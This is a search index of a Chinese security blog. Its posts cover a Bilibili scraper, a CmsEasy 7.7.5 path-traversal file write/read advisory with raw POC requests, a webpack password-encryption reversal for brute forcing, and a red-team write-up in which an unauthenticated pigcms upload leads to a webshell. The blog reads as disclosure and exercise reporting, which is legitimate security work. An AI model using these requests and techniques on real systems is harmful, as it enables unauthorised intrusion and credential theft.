{"pages":[{"title":"关于我","text":"KeepOnFigthing --> jdr 2020年6月29日开始学习web安全。 2021年大学毕业。 至今仍是菜狗+单身狗。 喜欢打网球，白嫖资源。 现就职于一家安全公司，是一名安全服务工程师。 目前在学习代码审计，app安全，以及内网渗透。 B站: https://space.bilibili.com/486838364EDUSRC：https://src.sjtu.edu.cn/profile/8186/ 安全团队公众号","link":"/about/index.html"}],"posts":[{"title":"python3 根据视频BV号爬B站视频的评论消息和UP主的个人信息","text":"python3 根据视频BV号爬B站视频的评论消息和UP主的个人信息 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293import reimport jsonimport requestsimport time, datetimeimport prettytablefrom textwrap import filldef Input_BV(bv_id): target_url_1 = &quot;https://www.bilibili.com/video/&quot;+str(bv_id) headers = { 'Cookie': '1', #cookie可以随意设置 'User-Agent': 'Mozilla/5.0' } resp_1 = requests.get(url = target_url_1 ) jsons = json.loads(re.search(r&quot;window\\.__INITIAL_STATE__=(.*?);&quot;, resp_1.text).group(1)) #获取对应视频BV号的UP主的信息，即获取mid mid = jsons['upData']['mid'] get_up_info(mid) #获取对应视频BV号下的评论，此时aid=oid oid = jsons['aid'] get_BV_comment(oid) #获取对应视频BV号的UP主信息def get_up_info(mid): url = &quot;https://api.bilibili.com/x/web-interface/card?article=true&amp;mid=&quot; + str(mid) headers = { 'Cookie': '1', #cookie可以随意设置 'User-Agent': 'Mozilla/5.0' } resp = requests.get(url, headers=headers) jsons = json.loads(resp.text) #up的名字 up_name = jsons['data']['card']['name'] #up的性别 up_sex = jsons['data']['card']['sex'] #up的粉丝数 up_fans = jsons['data']['card']['fans'] #up的关注数 up_attention = jsons['data']['card']['attention'] #up的个性签名 up_sign = jsons['data']['card']['sign'] #up的投稿数量 up_archive_count = jsons['data']['archive_count'] #up的获赞数量 up_like_num = jsons['data']['like_num'] #使用prettytable美化数据输出 table = prettytable.PrettyTable() #设置表头 table.field_names = ['up的姓名','up的性别','up的粉丝数','up的关注数','up的投稿数','up的获赞数','up的个性签名'] table.align['up的个性签名']='l' #个性签名左对齐 #将数据加入到表格 table.add_row([up_name,up_sex,str(up_fans),str(up_attention),str(up_archive_count),str(up_like_num),fill(up_sign,width=50)]) print(table) #获取对应视频BV号下的评论def get_BV_comment(oid): url = &quot;https://api.bilibili.com/x/v2/reply/main?callback=&amp;jsonp=jsonp&amp;next=0&amp;type=1&amp;mode=3&amp;plat=1&amp;oid=&quot; + str(oid) headers = { 'Cookie': '1', #cookie可以随意设置 'User-Agent': 'Mozilla/5.0' } resp = requests.get(url, headers=headers) jsons = json.loads(resp.text) table = prettytable.PrettyTable() # 定义表头 table.field_names = ['姓名','评论','评论时间'] table.align['姓名']='l' #左对齐 table.align['评论']='l' #左对齐 for i in jsons['data']['replies']: #获取评论人的姓名 name = i['member']['uname'] #获取评论人的评论内容 comment = i['content']['message'] #获取评论时间 time = i['ctime'] # 增加一行数据，列表里的元素按照顺序对应表头 table.add_row([fill(name,width=50),fill(comment,width=50),to_time(time)]) print(table) #将ctime时间戳转换成时间格式def to_time(time_stamp): timeArray = datetime.datetime.fromtimestamp(time_stamp) otherStyleTime = timeArray.strftime(&quot;%Y--%m--%d %H:%M:%S&quot;) return otherStyleTimeif __name__==&quot;__main__&quot;: BV_ID = input(&quot;请输入视频BV号：&quot;) Input_BV(BV_ID); 此处的评论没有爬完，只爬了最先盖楼的那个人。","link":"/2021/10/24/python3-%E6%A0%B9%E6%8D%AE%E8%A7%86%E9%A2%91BV%E5%8F%B7%E7%88%ACB%E7%AB%99%E8%A7%86%E9%A2%91%E7%9A%84%E8%AF%84%E8%AE%BA%E6%B6%88%E6%81%AF%E5%92%8CUP%E4%B8%BB%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/"},{"title":"CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞","text":"CmsEasy_7.7.5_20211012存在任意文件写入漏洞和任意文件读取漏洞 一、厂商官网cmseasy 二、安装包下载https://www.cmseasy.cn/download/ https://ftp.cmseasy.cn/CmsEasy7.x/CmsEasy_7.7.5_UTF-8_20211012.zip 2.1 任意文件写入漏洞getshell后台漏洞，需登录。 2.2.1 任意文件写入漏洞poc12345678910POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1Host: 192.168.31.96Content-Length: 57X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0Content-Type: application/x-www-form-urlencoded;Cookie: login_username=admin; login_password=357fce333f91905f3e7342d10e5a5ce4;Connection: closesid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php phpinfo();?&gt; .._d_ 代表 ../，此处用来路径穿越发送漏洞利用的poc数据包，响应内容是ok时，代表网站根目录下被写入了1.php文件。 访问http://192.168.31.96/1.php (或者是http://localhost/1.php)，此时发现phpinfo被成功执行。 2.2.2 任意文件写入漏洞代码分析出现此漏洞的文件是lib/admin/template_admin.php post方法传入sid=#data_d_.._d_.._d_.._d_1.php，经过一轮的正则替换，最后tpl=data/../../../1.php post方法传入scontent=&lt;?php phpinfo();?&gt;，先通过编码实例化，再通过正则替换将单引号转义，此时content=&lt;?php phpinfo();?&gt;，这里的正则处理是对XSS漏洞的处理，对写入的php代码不生效。 当site=default时，代码执行到最外层else处（第2789行），此过程中，content值不变，通过file_put_contents造成了任意文件写入漏洞。 2.2 任意文件读取漏洞后台漏洞，需登录。 2.2.1 任意文件读取漏洞poc12345678910POST /index.php?case=template&amp;act=fetch&amp;admin_dir=admin&amp;site=default HTTP/1.1Host: 192.168.31.96X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0Content-Type: application/x-www-form-urlencoded;Cookie: login_username=admin; login_password=357fce333f91905f3e7342d10e5a5ce4; Connection: closeContent-Length: 32id=#data_d_.._d_.._d_.._d_config_d_config_database.php .._d_ 代表 ../，此处用来路径穿越 发送漏洞利用的poc数据包响应内容是cmseasy网站配置文件config/config_database.php的文件内容信息。该响应信息中包含了数据库连接地址账号以及密码。 2.2.2 任意文件读取漏洞代码分析出现此漏洞的文件是lib/admin/template_admin.php post方法传入id=#data_d_.._d_.._d_.._d_config_d_config_database.php 通过一系列的正则替换tpl=data/../../../config/config_database.php 最后通过第2757行的file_get_contents函数读取到了配置文件信息。","link":"/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"title":"实战webpack_js算法逆向分析","text":"遇到一个网站，使用了webpack 输入账号密码后，发现密码被加密了。 此时尝试定位该加密算法，并正向爆破。 当前登录的请求接口是/prod-api/auth/login 此时全局搜索该接口 成功找到该接口文件 打开该js文件，通过分析js函数，可知2727行的r函数作用是登录请求，2719行的o函数作用是加密。 此时设置断点，观察数值变化 r函数中的t是用户名admin，e是明文密码123456。 此时下一步 密码e通过2728行的函数调用，传递到了加密函数o。 加密函数o中，t是明文密码，e是密钥，密钥是2021123456789012 加密后123456的密文是wzGWkli7/KSZszgljZhEng== 通过分析发现，此处的加解密算法的对象名是a,通过调用对象a下的属性，实现的加密。 将这段加密的函数，复制到我们的js文件中 此时尝试去找到a在哪声明的。 通过分析，发现a在2717行被声明 并且对象a的值，是由s调用了n中的3452模块。 此时我们要找到n，看n是在哪出现的，我们并把它给拿出来。 因此设置断点直接跟过去。 此时找到了n的声明。 我们将这段声明n函数的代码复制到js文件中，即把分发器复制到js代码中。 并在外部声明一个用于接收分发器值的变量 通过定位追踪 我们将o值，赋值给用户接收分发器函数返回值的变量。 即在分发器代码的末尾处进行赋值。 此时分发器确定了，这个时候要找分发器调用了哪些webpack的模块。 通过前面的分析可知，分发器调用的第一个webpack的模块是3452。 此时全局搜索3452是在哪个js文件下。 此时找到了3452模块，而3452模块又调用了大量的其他模块，因此我们要一一定位。 通过分析后发现，所有的模块和3452模块都是处于同一个js文件中的。 此时创建一个modules.js文件，用于管理这些模块。将该存放模块的js代码，全部复制粘贴到本地的modules.js文件中。 并设置全局变量进行调用即var window = global; 并在encrypt.js文件中导入该模块js文件。 并调用加密函数，查看加密结果。 执行代码后，报错，提示n未被定义。 报错的原因是因为，此时分发器的模块调用的结果，并未赋值给n，而是我最开始设置的变量flag，此flag接收了分发器的返回结果。因此我们要把n改成flag。 修改后，再次运行 123456在本地加密的结果和在前端加密的结果值是一样的。 此时尝试重复并多次加密明文。 使用nodejs，按行读写passwords.txt 并将密码的密文并输出到encrypt_passwors.txt中。 1234567891011121314151617const readline = require('readline');const fs = require('fs');( () =&gt; { let fRead = fs.createReadStream(&quot;passwords.txt&quot;); let objReadLine = readline.createInterface({ input: fRead }); objReadLine.on('line', function (line) { console.log(encrypt(line)); fs.writeFile('./encrypt_passwors.txt', encrypt(line)+'\\n', { 'flag': 'a' }, function(err) { if (err) { throw err; } }); });})(); 尝试去解密aes的加密密文，找了半天也没找到调用了哪些webpack的模块，因此解密失败了，太fw了。","link":"/2021/10/15/%E5%AE%9E%E6%88%98webpack-js%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"},{"title":"记一次攻防演练","text":"简介：领导通知，让我打十天攻防，前四天，平平无奇，两个权限，web系统都是外包的，没打进核心内网。 这次攻防，没有给靶标，也没有给资产，全靠自己进行信息搜集。 由于本人不会钓鱼，所以只能打打外网了。 前期信息搜集信息搜集主要以厂商系统为主，通过使用fofa，云悉，查ICP备案，APP脱壳逆向，公众号接口，小程序，天眼查查母公司以及子公司的备案和资产信息。通过能直接获取到的资产信息，进行二次信息搜集，主要是以C段,B段和目录扫描为主。 第五天测试网站的功能点，尝试黑盒找到漏洞，并想办法拿到权限。第五天主要是以代码审计为主。 通过信息找到找到子公司的一个备案网站系统。 根据左上角的功能提示，发现网站存在登录和注册功能，因此尝试注册一个账号。 点击注册按钮，发现跳转到登录界面。很奇怪，貌似注册功能无法正常使用。 f12查看源码发现端倪，注册相关的实现代码已经被注释掉了。 因此将注释符号删除，并使用注册功能注册了账号 此时使用注册功能成功注册了一个账号 并登录成功。 寻找上传接口，尝试文件上传。但是发现功能点似乎无法正常使用。 f12抓取上传接口的数据包。 访问该接口，上传表单成功出现。 尝试上传正常图片，均不能正常使用。提示都是文件大小不符合。 尝试利用TP框架漏洞获取权限尝试尝试寻找后台，也没有找到。 尝试寻找SQL注入，没有找到。 此时发现该网站系统使用了thinkphp框架，但是具体不知道是哪个版本。 常用于获取tp框架版本的方法都是利用报错或者敏感文件，但是这里，似乎都没有。 盲打一波tp5的rce，均失败。 此时陷入瓶颈期。 想到了，该系统一定是基于tp框架开发的，但是具体是哪个CMS这里还未知，使用云悉获取该CMS信息也失败了。 尝试利用cms的利用漏洞获取网站权限和数据此时无意间发现，上传接口的title中，泄露了该CMS信息，该cms为pigcms。 此时搜索有关该CMS的历史漏洞，通过cnvd平台。 尝试利用SQL注入漏洞，复现后均失败。 寻找CMS源码注：此处找到的源码版本不一定会和目标站点一致。 尝试去寻找源码。官网看了一眼，真的贵。离谱。怎么可能花钱。 通过网盘搜索，百度搜索，谷歌搜索的方式，下载了源码。 本地环境搭建。 看着还挺像那么回事的。 确定后台路径。 本机后台 目标站点后台。 这后台长的不怎么像，影响不大。 试了一下初始密码，没进去。 看了一下后台，注入漏洞挺多的，有tp3.1的注入，也有pigcms的注入，也能文件上传GETSHELL，也能模板注入GETSHELL。 白加黑代码审计前台任意文件上传GETSHELL试了一下常规的未授权测试方法，均失败，因此只能考虑审计出前台漏洞了。这里用自己之前写的一个工具，遍历当前目录下指定后缀的文件路径。 将路径文件字典导入burpsuite的intruter模块的payload中，并去掉payload encoding前面的勾。 开始爆破。并根据response判断哪些文件是未授权访问的。 此时成功找到了未授权的入口文件。 并发现了两处关于文件上传的函数。 action_picUpload 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788public function action_picUpload(){ $error=0; if (isset($_FILES['thumb'])){ $photo=$_FILES['thumb']; if(substr($photo['type'], 0, 5) == 'image') { switch ($photo['type']) { case 'image/jpeg': case 'image/jpg': case 'image/pjpeg': $ext = '.jpg'; break; case 'image/gif': $ext = '.gif'; break; case 'image/png': case 'image/x-png': $ext = '.png'; break; default: $error=-1; break; } if($error==0){ $time=SYS_TIME; $year=date('Y',$time); $month=date('m',$time); $day=date('d',$time); $pathInfo=upFileFolders($time); $dstFolder=$pathInfo['path']; $dstFile=ABS_PATH.'upload'.DIRECTORY_SEPARATOR.'temp'.$ext; //the size of file uploaded must under 1M if($photo['size']&gt;2000000){ $error=-2; return $error; } }else { return $error; } //if no error if($error==0){ $rand=randStr(4); //delete primary files if(file_exists($dstFolder.$time.$rand.$ext)){ unlink($dstFolder.$time.$rand.$ext); } if ($ext!='.gif'&amp;&amp;$ext!='.png'){ //save the temporary file move_uploaded_file($photo['tmp_name'],$dstFile); $imgInfo=getimagesize($dstFile); //generate new files $imageWidth=intval($_POST['width'])!=0?intval($_POST['width']):$imgInfo[0]; $imageHeight=intval($_POST['height'])!=0?intval($_POST['height']):$imgInfo[1]; bpBase::loadSysClass('image'); image::zfResize($dstFile,$dstFolder.$time.$rand.'.jpg',$imageWidth,$imageHeight,1|4,2); $ext='.jpg'; // }else { move_uploaded_file($photo['tmp_name'],$dstFolder.$time.$rand.$ext); } if (isset($_POST['channelid'])){//内容缩略图 $channelObj=bpBase::loadAppClass('channelObj','channel'); $thisChannel=$channelObj-&gt;getChannelByID($_POST['channelid']); $articleObj=bpBase::loadAppClass('articleObj','article'); $articleObj-&gt;setOtherThumb($thisChannel,$dstFile,$dstFolder,$time.$rand,'jpg'); } if ($ext!='.gif'&amp;&amp;$ext!='.png'){ @unlink($dstFile); } $location='http://'.$_SERVER['HTTP_HOST'].CMS_DIR_PATH.'/upload/images/'.$year.'/'.$month.'/'.$day.'/'.$time.$rand.$ext; $error=0; } }else { $error=-1; } }else { $error=-1; } if ($error==0){ echo $location; }else { $errors=array(-1=&gt;'你上传的不是图片',-2=&gt;'文件不能超过2M',-3=&gt;'图片地址不正确'); echo $errors[intval($error)]; }} action_picUpload的逻辑是，上传的图片文件时，name=thumb，content-type的值为switch选择结构中的image/jpg时，指定上传后，文件的后缀名ext是jpg。文件名的命名是随机的，根据时间指定。 读懂逻辑后发现，此处的action_picUpload是无法上传文件获取权限的。 继续审计第二次上传的函数。 action_flashUpload 阅读第二个上传函数的逻辑发现，当name的值是filepath，并且content-type的值是flash格式时，能够上传成功，上传后的后缀名是由filename的文件名后缀来确定的。 构造文件上传的poc数据包 发现上传成功，回显php文件路径。 查看本地监听的文件路径生成情况，并确定php文件的最后路径。 访问后，phpinfo被成功执行。 尝试上传到目标站点，并上传成功。 此时跟队友分享喜悦，并准备周一打内网。 由于和裁判沟通后，裁判要求，漏洞尽量要周一交。（意思是周末不攻防） 并得知提交0day漏洞是有额外加分。 蓝队周末居然上班等到周六后，下午访问一下phpinfo看看。结果发现，蓝队居然上班了。phpinfo的页面内容变成了hack. 页面不是phpinfo？重新上传一下，好家伙，不讲武德，裁判都说休战了，你居然给我搞事情。 这是之前已经成功执行的截图。 离谱的一批。 继续审计 数据导出+可能的任意文件写入漏洞。周日，开始重新审计。现在审计的思路主要是想办法拿到数据，并进入后台改配置，这样只要网站不关闭，我就有的是办法做webshell层面的权限维持，后面再做系统层面的权限维持。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596private function export_database($tables,$sqlcompat,$sqlcharset,$sizelimit,$action,$fileid,$random,$tableid,$startfrom) { $dumpcharset = $sqlcharset ? $sqlcharset : str_replace('-', '', DB_CHARSET); $fileid = ($fileid != '') ? $fileid : 1; if($fileid==1 &amp;&amp; $tables) { if(!isset($tables) || !is_array($tables)) showMessage('请选择要备份的表'); $random = mt_rand(1000, 9999); setCache('backupTables',serialize($tables)); } else { if(!$tables = unserialize(getCache('backupTables'))) showMessage('请选择要备份的表'); } if($sqlcharset) { $this-&gt;db-&gt;query(&quot;SET NAMES '&quot;.$sqlcharset.&quot;';\\n\\n&quot;); } $tabledump = ''; $tableid = ($tableid!= '') ? $tableid - 1 : 0; $startfrom = ($startfrom != '') ? intval($startfrom) : 0; for($i = $tableid; $i &lt; count($tables) &amp;&amp; strlen($tabledump) &lt; $sizelimit * 1000; $i++) { global $startrow; $offset = 100; if(!$startfrom) { if($tables[$i]!=AUTO_TABLE_PREFIX.'session') { $tabledump .= &quot;DROP TABLE IF EXISTS `$tables[$i]`;\\n&quot;; } $createtable = $this-&gt;db-&gt;query(&quot;SHOW CREATE TABLE `$tables[$i]` &quot;); $create = $this-&gt;db-&gt;fetch_next(); $tabledump .= $create['Create Table'].&quot;;\\n\\n&quot;; $this-&gt;db-&gt;free_result($createtable); if($sqlcompat == 'MYSQL41' &amp;&amp; $this-&gt;db-&gt;version() &lt; '4.1') { $tabledump = preg_replace(&quot;/TYPE\\=([a-zA-Z0-9]+)/&quot;, &quot;ENGINE=\\\\1 DEFAULT CHARSET=&quot;.$dumpcharset, $tabledump); } if($this-&gt;db-&gt;version() &gt; '4.1' &amp;&amp; $sqlcharset) { $tabledump = preg_replace(&quot;/(DEFAULT)*\\s*CHARSET=[a-zA-Z0-9]+/&quot;, &quot;DEFAULT CHARSET=&quot;.$sqlcharset, $tabledump); } if($tables[$i]==AUTO_TABLE_PREFIX.'session') { $tabledump = str_replace(&quot;CREATE TABLE `&quot;.DB_PRE.&quot;session`&quot;, &quot;CREATE TABLE IF NOT EXISTS `&quot;.DB_PRE.&quot;session`&quot;, $tabledump); } } $numrows = $offset; while(strlen($tabledump) &lt; $sizelimit * 1000 &amp;&amp; $numrows == $offset) { if($tables[$i]==AUTO_TABLE_PREFIX.'session') break; $sql = &quot;SELECT * FROM `$tables[$i]` LIMIT $startfrom, $offset&quot;; $numfields = $this-&gt;db-&gt;num_fields($sql); $numrows = $this-&gt;db-&gt;num_rows($sql); $fields_name = $this-&gt;db-&gt;get_fields($tables[$i]); $rows = $this-&gt;db-&gt;query($sql); $name = array_keys($fields_name); $r = array(); while ($row = $this-&gt;db-&gt;fetch_next()) { $r[] = $row; $comma = &quot;&quot;; $tabledump .= &quot;INSERT INTO `$tables[$i]` VALUES(&quot;; for($j = 0; $j &lt; $numfields; $j++) { $tabledump .= $comma.&quot;'&quot;.mysql_real_escape_string($row[$name[$j]]).&quot;'&quot;; $comma = &quot;,&quot;; } $tabledump .= &quot;);\\n&quot;; } $this-&gt;db-&gt;free_result($rows); $startfrom += $offset; } $tabledump .= &quot;\\n&quot;; $startrow = $startfrom; $startfrom = 0; } if(trim($tabledump)) { $tabledump = &quot;# time:&quot;.date('Y-m-d H:i:s').&quot;\\n# bupu auto system:http://www.bupu.net\\n# --------------------------------------------------------\\n\\n\\n&quot;.$tabledump; $tableid = $i; $filename = date('Ymd').'_'.$random.'_'.$fileid.'.sql'; $altid = $fileid; $fileid++; $backUpFolder=ABS_PATH.DIRECTORY_SEPARATOR.'backup'; if (!file_exists($backUpFolder)&amp;&amp;!is_dir($backUpFolder)){ mkdir($backUpFolder,0777); } $bakfile_path = ABS_PATH.'backup'.DIRECTORY_SEPARATOR.'data'.date('Y-m-d',SYS_TIME); if (!file_exists($bakfile_path)&amp;&amp;!is_dir($bakfile_path)){ mkdir($bakfile_path,0777); } $bakfile = $bakfile_path.DIRECTORY_SEPARATOR.$filename; if(!is_writable($bakfile_path)) showMessage('backup文件夹不可写'); file_put_contents($bakfile, $tabledump); @chmod($bakfile, 0777); showmessage('正在备份，请不要关闭浏览器'.&quot; $filename &quot;, '?m=manage&amp;c=database&amp;a=action_export&amp;sizelimit='.$sizelimit.'&amp;sqlcompat='.$sqlcompat.'&amp;sqlcharset='.$sqlcharset.'&amp;tableid='.$tableid.'&amp;fileid='.$fileid.'&amp;startfrom='.$startrow.'&amp;random='.$random.'&amp;allow='.$allow); } else { $bakfile_path = ABS_PATH.'backup'.DIRECTORY_SEPARATOR.'database'; //file_put_contents($bakfile_path.DIRECTORY_SEPARATOR.'index.html',''); delCache('backupTables'); showmessage('备份成功，数据备份在了“/backup/data'.date('Y-m-d',SYS_TIME).'”文件夹中'); } } 通过阅读此处的代码逻辑，发现指定数据表名称，即可导出数据。 找到该sql文件路径。 前端访问并下载成功。 可以通过此方法，拿到后台管理员账号密码。 继续审计发现，此处的导出时，文件名可控。 此时可以发现，可能可以截断后缀。 尝试截断，并成功。 尴尬的是，文件内容并没有写入。 查了相关资料后发现。 用冒号截断的确会这样，但是用windows文件流截断，文件也并没有生成。这就很麻烦了。 此处也没有想到比较好的方法去绕过。 就暂时放着了。 下午的时候尝试去下一下数据表的文件，结果发了几个数据包。 蓝队直接将admin.php这个入口文件给删了。牛逼牛逼。 跟队友说了一下情况。 晚上准备写博客。 准备打开目标站点截几个图。 结果发现，蓝队直接给你关站了。笑死。 一片红，笑死我了，和队友吐槽大无语事件。 等周一明天举报了。","link":"/2021/10/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"}],"tags":[{"name":"爬虫,B站","slug":"爬虫-B站","link":"/tags/%E7%88%AC%E8%99%AB-B%E7%AB%99/"},{"name":"php代码审计","slug":"php代码审计","link":"/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Javascript","slug":"Javascript","link":"/tags/Javascript/"},{"name":"红蓝对抗","slug":"红蓝对抗","link":"/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"}],"categories":[{"name":"python3","slug":"python3","link":"/categories/python3/"},{"name":"0day挖掘","slug":"0day挖掘","link":"/categories/0day%E6%8C%96%E6%8E%98/"},{"name":"webpack算法逆向","slug":"webpack算法逆向","link":"/categories/webpack%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/"},{"name":"0day,信息搜集","slug":"0day-信息搜集","link":"/categories/0day-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"}]}